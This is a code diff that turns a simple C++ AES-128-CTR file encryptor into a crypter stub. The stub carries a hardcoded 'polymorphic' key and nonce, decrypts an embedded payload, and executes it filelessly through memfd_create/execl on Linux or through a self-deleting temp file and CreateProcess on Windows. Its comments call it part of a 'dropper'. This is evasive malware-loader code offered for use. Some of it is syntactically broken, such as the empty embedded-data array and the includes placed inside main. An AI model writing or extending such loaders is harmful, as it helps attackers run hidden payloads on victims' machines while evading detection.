@@ -1,3 +1,4 @@
+
 #include <iostream>
 #include <fstream>
 #include <vector>
@@ -5,9 +6,16 @@
 #include <cstring>
 #include <cstdlib>
 #include <cstdint>
+#include <random>
 #include <ctime>
 
-// AES-128-CTR implementation
+// Polymorphic key and nonce (no obfuscation)
+const std::string KEY_puUZLzHK = "215daa437e23f36e8525cff91477f44c";
+const std::string NONCE_wuhVJag7 = "c279b8af3e179ff8df7bfc7594b85e24";
+
+
+
+// AES-128-CTR implementation (same as native_encryptor/dropper)
 static const uint8_t sbox[256] = {
     0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
     0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
@@ -27,10 +35,12 @@ static const uint8_t sbox[256] = {
     0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
 };
 
+// Round constants for key expansion
 static const uint8_t rcon[10] = {
     0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36
 };
 
+// AES helper functions
 inline uint8_t gmul(uint8_t a, uint8_t b) {
     uint8_t p = 0;
     for (int i = 0; i < 8; i++) {
@@ -51,10 +61,23 @@ inline void subBytes(uint8_t* state) {
 
 inline void shiftRows(uint8_t* state) {
     uint8_t temp;
-    temp = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = temp;
+    // Row 1: shift left by 1
+    temp = state[1];
+    state[1] = state[5];
+    state[5] = state[9];
+    state[9] = state[13];
+    state[13] = temp;
+    
+    // Row 2: shift left by 2
     temp = state[2]; state[2] = state[10]; state[10] = temp;
     temp = state[6]; state[6] = state[14]; state[14] = temp;
-    temp = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = temp;
+    
+    // Row 3: shift left by 3
+    temp = state[3];
+    state[3] = state[15];
+    state[15] = state[11];
+    state[11] = state[7];
+    state[7] = temp;
 }
 
 inline void mixColumns(uint8_t* state) {
@@ -175,72 +198,118 @@ inline void aesCtrCrypt(const uint8_t* input, uint8_t* output, size_t length,
     }
 }
 
-// Simple random number generator
-inline uint32_t simpleRand() {
-    static uint32_t seed = 0x12345678;
-    seed = seed * 1103515245 + 12345;
-    return seed;
+// Convert hex string to bytes
+void hexToBytes(const std::string& hex, uint8_t* bytes) {
+    for (size_t i = 0; i < hex.length(); i += 2) {
+        bytes[i/2] = std::stoi(hex.substr(i, 2), nullptr, 16);
+    }
 }
 
-int main(int argc, char* argv[]) {
-    if (argc != 2) {
-        std::cout << "=== Drag & Drop Encryptor ===" << std::endl;
-        std::cout << "Usage: " << argv[0] << " <file_to_encrypt>" << std::endl;
-        std::cout << "Just drag and drop any file onto this executable!" << std::endl;
+int main() {
+    // Embedded encrypted data
+    uint8_t encryptedData[] = // Standalone stub - no embedded data};
+    size_t dataSize = sizeof(encryptedData);
+    
+    // Convert hex strings to bytes
+    uint8_t key[16], nonce[16];
+    hexToBytes(KEY_puUZLzHK, key);
+    hexToBytes(NONCE_wuhVJag7, nonce);
+    
+    // Decrypt the data using AES-128-CTR
+    aesCtrCrypt(encryptedData, encryptedData, dataSize, key, nonce);
+    
+    // Fileless execution - execute directly from memory
+    #ifdef __linux__
+        // Linux: Use memfd_create for anonymous file descriptor
+        #include <sys/mman.h>
+        #include <sys/syscall.h>
+        #include <unistd.h>
+        #include <fcntl.h>
+        
+        int memfd = memfd_create("temp_exec", 0);
+        if (memfd == -1) {
+            std::cerr << "Failed to create memory file descriptor" << std::endl;
+            return 1;
+        }
+        
+        // Write decrypted data to memory file descriptor
+        if (write(memfd, encryptedData, dataSize) != static_cast<ssize_t>(dataSize)) {
+            std::cerr << "Failed to write to memory file descriptor" << std::endl;
+            close(memfd);
+            return 1;
+        }
+        
+        // Make executable
+        if (fchmod(memfd, 0755) == -1) {
+            std::cerr << "Failed to set executable permissions" << std::endl;
+            close(memfd);
+            return 1;
+        }
+        
+        // Execute from memory
+        std::string memfdPath = "/proc/self/fd/" + std::to_string(memfd);
+        execl(memfdPath.c_str(), memfdPath.c_str(), nullptr);
+        
+        // If execl fails, clean up
+        close(memfd);
+        std::cerr << "Failed to execute from memory" << std::endl;
         return 1;
-    }
-    
-    std::string inputFile = argv[1];
-    std::string outputFile = inputFile + ".enc";
-    
-    // Read input file
-    std::ifstream inFile(inputFile, std::ios::binary);
-    if (!inFile.is_open()) {
-        std::cerr << "Error: Cannot open file: " << inputFile << std::endl;
-        return 1;
-    }
-    
-    std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(inFile)),
-                                std::istreambuf_iterator<char>());
-    inFile.close();
-    
-    if (fileData.empty()) {
-        std::cerr << "Error: File is empty" << std::endl;
-        return 1;
-    }
-    
-    // Generate random key and nonce
-    uint8_t aesKey[16];
-    uint8_t nonce[16];
-    
-    for (int i = 0; i < 16; i++) {
-        aesKey[i] = simpleRand() & 0xFF;
-        nonce[i] = simpleRand() & 0xFF;
-    }
-    
-    std::cout << "Generated random key and nonce for encryption." << std::endl;
-    
-    // Encrypt the data
-    aesCtrCrypt(fileData.data(), fileData.data(), fileData.size(), aesKey, nonce);
-    
-    // Write encrypted file (nonce + encrypted data)
-    std::ofstream outFile(outputFile, std::ios::binary);
-    if (!outFile.is_open()) {
-        std::cerr << "Error: Cannot create output file: " << outputFile << std::endl;
-        return 1;
-    }
-    
-    // Write nonce first
-    outFile.write(reinterpret_cast<char*>(nonce), 16);
-    
-    // Write encrypted data
-    outFile.write(reinterpret_cast<char*>(fileData.data()), fileData.size());
-    outFile.close();
-    
-    std::cout << "✓ File encrypted successfully!" << std::endl;
-    std::cout << "  Input: " << inputFile << std::endl;
-    std::cout << "  Output: " << outputFile << std::endl;
-    std::cout << "  Size: " << fileData.size() << " bytes" << std::endl;
-    
-    return 0;
+        
+    #elif defined(_WIN32)
+        // Windows: Use CreateProcess with memory execution
+        #include <windows.h>
+        
+        // Create temporary file in memory (Windows doesn't have memfd_create)
+        char tempPath[MAX_PATH];
+        GetTempPathA(MAX_PATH, tempPath);
+        char tempFileName[MAX_PATH];
+        GetTempFileNameA(tempPath, "exe", GetTickCount(), tempFileName);
+        
+        // Write decrypted data to temp file
+        HANDLE hFile = CreateFileA(tempFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            std::cerr << "Failed to create temporary file" << std::endl;
+            return 1;
+        }
+        
+        DWORD bytesWritten;
+        if (!WriteFile(hFile, encryptedData, dataSize, &bytesWritten, NULL) || bytesWritten != dataSize) {
+            std::cerr << "Failed to write to temporary file" << std::endl;
+            CloseHandle(hFile);
+            return 1;
+        }
+        CloseHandle(hFile);
+        
+        // Execute the temporary file
+        STARTUPINFOA si = {0};
+        PROCESS_INFORMATION pi = {0};
+        si.cb = sizeof(si);
+        
+        if (CreateProcessA(tempFileName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            // File will be deleted automatically due to FILE_FLAG_DELETE_ON_CLOSE
+            return 0;
+        } else {
+            std::cerr << "Failed to execute file" << std::endl;
+            return 1;
+        }
+        
+    #else
+        // Fallback: Write to temporary file and execute
+        std::string tempFile = "/tmp/temp_exec_" + std::to_string(getpid());
+        std::ofstream outFile(tempFile, std::ios::binary);
+        if (outFile.is_open()) {
+            outFile.write(reinterpret_cast<char*>(encryptedData), dataSize);
+            outFile.close();
+            chmod(tempFile.c_str(), 0755);
+            execl(tempFile.c_str(), tempFile.c_str(), nullptr);
+            unlink(tempFile.c_str()); // Clean up if execl fails
+            std::cerr << "Failed to execute file" << std::endl;
+            return 1;
+        } else {
+            std::cerr << "Failed to create temporary file" << std::endl;
+            return 1;
+        }
+    #endif
 }
